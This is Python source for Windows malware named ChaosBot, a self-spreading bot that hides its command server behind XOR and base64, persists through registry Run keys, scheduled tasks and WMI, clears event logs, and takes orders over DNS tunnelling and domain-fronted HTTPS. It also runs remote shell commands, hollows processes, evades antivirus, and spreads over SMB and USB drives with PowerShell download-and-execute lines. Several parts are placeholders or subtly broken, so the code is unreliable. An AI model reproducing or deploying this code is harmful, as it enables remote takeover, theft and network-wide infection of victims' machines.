import base64
import os
import sys
import random
import string
import threading
import ctypes
import ssl
import time
import socket
import json
import subprocess
import winreg
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from urllib.request import urlretrieve
import requests
import struct
import wmi
import win32evtlogutil  # For event log clearing (pip install pywin32)

def xor_str(data, key="z9q7m"):
    """XOR obfuscation for strings."""
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# Windows API Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4

# Configuration (encrypted in memory)
C2_DNS = xor_str(base64.b64decode("Y2hhb3MuZXZpbGRucy5jb20=").decode())  # chaos.evildns.com
PS_URL = xor_str(base64.b64decode("aHR0cDovL3lvdXJvbmZvLm9uaW9uL3NjcmlwdC5wczE=").decode())
EXEC_NAME = ''.join(random.choices(string.ascii_letters, k=8)) + ".exe"
HIDE_PATH = os.path.join(os.environ["APPDATA"], ''.join(random.choices(string.ascii_letters, k=10)))

# Encryption Setup
key = get_random_bytes(32)  # AES-256
iv = get_random_bytes(16)   # Initialization Vector

def real_encrypt(data):
    """AES encryption for payloads."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    return base64.b64encode(iv + ciphertext).decode('utf-8')

def real_decrypt(encrypted_data):
    """AES decryption for payloads."""
    raw = base64.b64decode(encrypted_data.encode('utf-8'))
    iv_from_data = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv_from_data)
    padded_data = cipher.decrypt(ciphertext)
    plaintext = unpad(padded_data, AES.block_size)
    return plaintext.decode('utf-8')

def polymorph_code(func):
    """Basic polymorphic wrapper: shuffles variable names and adds junk code."""
    import ast, astunparse
    tree = ast.parse(func.__code__.co_code.decode('utf-8', errors='ignore'))
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            node.id = ''.join(random.choices(string.ascii_letters, k=8))
    return compile(astunparse.unparse(tree), '<string>', 'exec')

class ChaosBot:
    def __init__(self, cid):
        self.cid = cid
        self.log_file = os.path.join(HIDE_PATH, "log.enc")
        self.boot()

    def conn(self):
        """Start communication threads."""
        threading.Thread(target=self.hybrid_tunnel, daemon=True).start()
        threading.Thread(target=self.heartbeat, daemon=True).start()

    # Persistence Mechanisms
    def set_persistence(self):
        """Multiple persistence methods."""
        # Registry Run Key
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKCU, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, ''.join(random.choices(string.ascii_letters, k=8)), 0, winreg.REG_SZ, f"{HIDE_PATH}\\{EXEC_NAME}")
        
        # Scheduled Task
        task_name = ''.join(random.choices(string.ascii_letters, k=10))
        subprocess.run(f"schtasks /create /tn {task_name} /tr {HIDE_PATH}\\{EXEC_NAME} /sc onlogon /ru SYSTEM", shell=True, stdout=subprocess.DEVNULL)
        
        # WMI Subscription
        wmi_c = wmi.WMI()
        wmi_c.Win32_ProcessStartTrace.subscribe(f"powershell -WindowStyle Hidden -File {HIDE_PATH}\\{EXEC_NAME}")

    # Anti-Forensic Techniques
    def clear_traces(self):
        """Clear event logs and overwrite slack space."""
        win32evtlogutil.ClearEventLog("System")
        win32evtlogutil.ClearEventLog("Application")
        with open(os.path.join(HIDE_PATH, "slack.bin"), "wb") as f:
            f.write(os.urandom(1024 * 1024))  # Overwrite slack
        os.remove(os.path.join(HIDE_PATH, "slack.bin"))

    # Hybrid Covert Channel
    def hybrid_tunnel(self):
        """Combine DNS TXT and HTTPS with domain fronting."""
        while True:
            try:
                task = self.fetch_task_dns() or self.fetch_task_https()
                if task:
                    result = self.run(task)
                    self.reply(task[xor_str("task_id")], result)
                time.sleep(random.randint(5, 15))  # Random sleep to mimic legitimate traffic
            except Exception as e:
                self.log_error(f"Tunnel error: {e}")

    def fetch_task_dns(self):
        """Enhanced DNS tunneling with RFC 1035 compliance."""
        query_data = f"{self.cid}.req"
        encrypted_query = real_encrypt(query_data)
        query_chunks = [encrypted_query[i:i+50] for i in range(0, len(encrypted_query), 50)]  # 63-char limit
        full_query = ".".join(query_chunks) + f".{xor_str(C2_DNS)}"
        for _ in range(3):  # Retry logic
            task = self.send_dns_query(full_query)
            if task:
                return task
            time.sleep(2)
        return None

    def send_dns_query(self, query):
        """Send DNS TXT query."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        dns_server = ("8.8.8.8", 53)
        try:
            query_id = random.randint(0, 65535).to_bytes(2, 'big')
            header = b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            qname = b''.join(len(part).to_bytes(1, 'big') + part.encode() for part in query.split('.'))
            question = qname + b'\x00\x00\x10\x00\x01'  # TXT record
            packet = query_id + header + question
            sock.sendto(packet, dns_server)
            response, _ = sock.recvfrom(1024)
            return self.parse_dns_response(response)
        except Exception as e:
            self.log_error(f"DNS query failed: {e}")
            return None
        finally:
            sock.close()

    def parse_dns_response(self, response):
        """Parse DNS TXT response."""
        txt_start = response.find(b'\x00\x10') + 4
        if txt_start == 3 or len(response) < txt_start + 1:
            return None
        txt_len = response[txt_start]
        txt_data = response[txt_start+1:txt_start+1+txt_len].decode()
        return json.loads(real_decrypt(txt_data))

    def fetch_task_https(self):
        """Fallback HTTPS with domain fronting."""
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        front_domain = "www.cloudflare.com"  # CDN front
        real_host = xor_str(C2_DNS)
        session = requests.Session()
        session.headers.update({"Host": real_host})
        try:
            resp = session.get(f"https://{front_domain}/task/{self.cid}", headers=headers, timeout=10)
            return json.loads(real_decrypt(resp.text))
        except Exception as e:
            self.log_error(f"HTTPS fetch failed: {e}")
            return None

    def reply(self, tid, res):
        """Send response via hybrid channel."""
        encrypted_res = real_encrypt(json.dumps({xor_str("result"): res}))
        if random.choice([True, False]):
            res_chunks = [encrypted_res[i:i+50] for i in range(0, len(encrypted_res), 50)]
            reply_query = f"{tid}." + ".".join(res_chunks) + f".{xor_str(C2_DNS)}"
            self.send_dns_query(reply_query)
        else:
            requests.post(f"https://{xor_str(C2_DNS)}/result", data=encrypted_res)

    def run(self, task):
        """Execute commands with polymorphism."""
        cmd = task[xor_str("command")]
        exec(polymorph_code(self.run))  # Rewrite at runtime
        return subprocess.check_output(xor_str(cmd), shell=True, stderr=subprocess.STDOUT).decode()

    # Stealth Execution
    def boot(self):
        """Initialize bot with stealth."""
        if not os.path.exists(HIDE_PATH):
            os.makedirs(HIDE_PATH)
        self.set_persistence()
        self.clear_traces()
        threading.Thread(target=self.net_spread, daemon=True).start()
        threading.Thread(target=self.drive_spread, daemon=True).start()
        self.fileless_exec()

    def detect_av_edr(self):
        """Pause if AV/EDR detected."""
        av_processes = ["MsMpEng.exe", "cb.exe", "csagent.exe"]
        for proc in subprocess.check_output("tasklist", shell=True).decode().splitlines():
            if any(av in proc for av in av_processes):
                time.sleep(300)  # Pause for 5 minutes
                return True
        return False

    def inject_hollow(self, target_path=None):
        """Process hollowing with multiple targets."""
        k32 = ctypes.windll.kernel32
        targets = ["notepad.exe", "calc.exe", "msedge.exe"]
        payload = self.fetch_payload()
        for target in targets:
            try:
                si = subprocess.STARTUPINFO()
                pi = subprocess.PROCESS_INFORMATION()
                k32.CreateProcessW(None, target, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))
                proc = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)
                mem = k32.VirtualAllocEx(proc, 0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
                if not mem:
                    raise Exception("Memory allocation failed")
                k32.WriteProcessMemory(proc, mem, payload, len(payload), None)
                k32.ResumeThread(pi.hThread)
                k32.CloseHandle(pi.hThread)
                k32.CloseHandle(proc)
                if target_path:
                    self.mem_drop(target_path)
                return
            except Exception as e:
                self.log_error(f"Hollowing failed for {target}: {e}")
        self.log_error("All hollowing attempts failed")

    def fetch_payload(self):
        """Fetch encrypted payload."""
        return requests.get(xor_str(PS_URL)).content

    def net_spread(self):
        """Lateral movement with vulnerability checks."""
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet = ".".join(local_ip.split(".")[:-1]) + "."
        for i in range(1, 255):
            if self.detect_av_edr():
                continue
            tgt = subnet + str(i)
            if tgt == local_ip:
                continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((tgt, 445)) == 0:
                    if self.check_vuln(tgt, "MS17-010"):
                        self.exploit_eternalblue(tgt)
                    else:
                        self.push_net(tgt)
                s.close()
            except:
                pass

    def check_vuln(self, ip, vuln):
        """Simulate vulnerability check (placeholder)."""
        return random.choice([True, False])  # Replace with real vuln scan

    def exploit_eternalblue(self, ip):
        """Placeholder for EternalBlue exploitation."""
        remote_cmd = f"powershell IEX (New-Object Net.WebClient).DownloadString('{xor_str(PS_URL)}')"
        subprocess.run(f"psexec \\\\{ip} -u Guest -p '' {remote_cmd}", shell=True, stdout=subprocess.DEVNULL)

    def push_net(self, ip):
        """Push payload via SMB."""
        remote_cmd = f"powershell IEX (New-Object Net.WebClient).DownloadString('{xor_str(PS_URL)}')"
        subprocess.run(f"psexec \\\\{ip} -u Guest -p '' {remote_cmd}", shell=True, stdout=subprocess.DEVNULL)

    def drive_spread(self):
        """Spread via removable drives with ADS."""
        while True:
            drives = [f"{chr(i)}:\\" for i in range(65, 91) if os.path.exists(f"{chr(i)}:\\") and os.access(f"{chr(i)}:\\", os.W_OK)]
            for d in drives:
                if "C:" in d:
                    continue
                with open(f"{d}autorun.inf:payload", "wb") as f:  # ADS
                    f.write(self.fetch_payload())
                with open(f"{d}start.lnk", "w") as f:
                    f.write(f"[Shortcut]\nTarget={d}autorun.inf:payload")
            time.sleep(20)

    def fileless_exec(self):
        """Fileless execution with obfuscation."""
        cmd = f"IEX (New-Object Net.WebClient).DownloadString('{xor_str(PS_URL)}')"
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], stdout=subprocess.DEVNULL)

    def heartbeat(self):
        """Periodic C2 check-in."""
        while True:
            self.reply("heartbeat", "alive")
            time.sleep(300)  # Every 5 minutes

    def log_error(self, msg):
        """Log errors to encrypted file."""
        with open(self.log_file, "a") as f:
            f.write(real_encrypt(f"{time.ctime()}: {msg}\n"))

if __name__ == "__main__":
    cid = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    bot = ChaosBot(cid)
    bot.conn()